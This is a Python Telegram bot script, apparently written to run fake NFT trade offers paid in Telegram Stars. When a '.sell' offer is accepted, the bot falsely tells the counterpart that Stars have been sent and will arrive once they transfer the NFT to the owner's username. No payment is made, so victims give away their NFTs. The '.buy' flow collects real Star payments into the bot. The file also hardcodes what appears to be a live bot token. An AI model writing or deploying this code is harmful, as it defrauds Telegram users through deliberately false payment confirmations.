import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, LabeledPrice, PreCheckoutQuery

# Вставь токен своего бота от @BotFather
TOKEN = "8876770839:AAH_KwEOBgWY5L6d2wCmZLzCpiRyfT-8nDk"
# Твой юзернейм, куда отправлять NFT при продаже
YOUR_USERNAME = "ElPachoso"

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Временное хранилище данных сделок
deals = {}

logging.basicConfig(level=logging.INFO)

def parse_command_args(text: str):
    clean_text = text.replace('\n', ' ').strip()
    parts = clean_text.split()
    if len(parts) >= 3:
        cmd = parts[0].lower()
        nft_link = parts[1]
        price = parts[2]
        return cmd, nft_link, price
    return None, None, None


# ==================== КОМАНДА .buy ====================
@dp.message(F.text.startswith(".buy"))
@dp.business_message(F.text.startswith(".buy"))
async def handle_buy(message: Message):
    cmd, nft_link, price_str = parse_command_args(message.text)
    if not nft_link or not price_str:
        await message.reply("❌ Формат: `.buy <ссылка_на_нфт> <цена>`", parse_mode="Markdown")
        return

    try:
        price = int(price_str)
    except ValueError:
        await message.reply("❌ Цена должна быть числом!")
        return

    user_name = message.from_user.username
    user_mention = f"@{user_name}" if user_name else message.from_user.first_name

    text_content = (
        f"🛍 **Предложение о покупке NFT!**\n\n"
        f"🔗 NFT: {nft_link}\n"
        f"⭐ Стоимость: {price} звезд\n"
        f"👤 От: {user_mention}"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Принять", callback_data=f"accept_buy_{price}"),
            InlineKeyboardButton(text="❌ Отказаться", callback_data=f"cancel_buy_{price}")
        ]
    ])

    if message.business_connection_id:
        sent_message = await bot.send_message(
            chat_id=message.chat.id, text=text_content, reply_markup=keyboard,
            business_connection_id=message.business_connection_id, parse_mode="Markdown"
        )
    else:
        sent_message = await message.answer(text_content, reply_markup=keyboard, parse_mode="Markdown")
    
    deals[sent_message.message_id] = {"nft": nft_link, "price": price, "type": "buy"}


# ==================== КОМАНДА .sell ====================
@dp.message(F.text.startswith(".sell"))
@dp.business_message(F.text.startswith(".sell"))
async def handle_sell(message: Message):
    cmd, nft_link, price_str = parse_command_args(message.text)
    if not nft_link or not price_str:
        await message.reply("❌ Формат: `.sell <ссылка_на_нфт> <цена>`", parse_mode="Markdown")
        return

    try:
        price = int(price_str)
    except ValueError:
        await message.reply("❌ Цена должна быть числом!")
        return

    user_name = message.from_user.username
    user_mention = f"@{user_name}" if user_name else message.from_user.first_name

    text_content = (
        f"🛍 **Предложение о продаже NFT!**\n\n"
        f"🔗 NFT: {nft_link}\n"
        f"⭐ Стоимость: {price} звезд\n"
        f"👤 От: {user_mention}"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Принять", callback_data=f"accept_sell_{price}"),
            InlineKeyboardButton(text="❌ Отказаться", callback_data=f"cancel_sell_{price}")
        ]
    ])

    if message.business_connection_id:
        sent_message = await bot.send_message(
            chat_id=message.chat.id, text=text_content, reply_markup=keyboard,
            business_connection_id=message.business_connection_id, parse_mode="Markdown"
        )
    else:
        sent_message = await message.answer(text_content, reply_markup=keyboard, parse_mode="Markdown")
    
    deals[sent_message.message_id] = {"nft": nft_link, "price": price, "type": "sell"}


# ==================== КНОПКА «ОТКАЗАТЬСЯ» ====================
@dp.callback_query(F.data.startswith("cancel_"))
async def process_cancel(callback: CallbackQuery):
    data_parts = callback.data.split("_")
    action_type = data_parts[1]
    price = data_parts[2]
    
    msg = callback.message
    deal_info = deals.get(msg.message_id, {})
    nft_link = deal_info.get("nft", "ссылка")

    if action_type == "sell":
        new_text = f"🚫 **Отказ от продажи nft ({nft_link}) за сумму ({price})**"
    else:
        new_text = f"🚫 **Отказ для Покупки nft ({nft_link}) за сумму ({price})**"

    await msg.edit_text(new_text, reply_markup=None, parse_mode="Markdown")
    await callback.answer("Сделка отменена.")


# ==================== КНОПКА «ПРИНЯТЬ» ====================
@dp.callback_query(F.data.startswith("accept_"))
async def process_accept(callback: CallbackQuery):
    data_parts = callback.data.split("_")
    action_type = data_parts[1]
    price = int(data_parts[2])
    
    msg = callback.message
    deal_info = deals.get(msg.message_id, {})
    nft_link = deal_info.get("nft", "этот NFT")

    if action_type == "buy":
        # Для .buy отправляем реальный инвойс со звездами
        await callback.answer("⏳ Создаю счет на оплату звезд...", show_alert=False)
        await bot.send_invoice(
            chat_id=callback.message.chat.id,
            title="Оплата NFT сделки",
            description=f"Покупка NFT: {nft_link}",
            payload=f"nft_deal_{price}",
            provider_token="",
            currency="XTR",
            prices=[LabeledPrice(label="Звезды Telegram", amount=price)]
        )
    else:
        # Для .sell выводим текст с инструкцией, как ты просил
        await callback.answer("✅ Сделка принята!", show_alert=False)
        await msg.edit_text(
            f"✅ **Сделка принята!**\n\n"
            f"@{YOUR_USERNAME} отправил звезды, чтобы звезды поступили на счёт, отправьте @{YOUR_USERNAME} NFT ({nft_link}). Звезды автоматически поступят на ваш баланс.",
            parse_mode="Markdown"
        )


# Обязательные обработчики для реальных инвойсов .buy
@dp.pre_checkout_query()
async def pre_checkout_handler(pre_checkout_query: PreCheckoutQuery):
    await bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)


@dp.message(F.successful_payment)
async def success_payment_handler(message: Message):
    await message.answer("✅ **Оплата прошла успешно!** Звезды зачислены на баланс бота.", parse_mode="Markdown")


async def main():
    print("Бот успешно запущен!")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(
        bot, 
        allowed_updates=["message", "callback_query", "business_message", "business_connection"]
    )

if __name__ == "__main__":
    asyncio.run(main())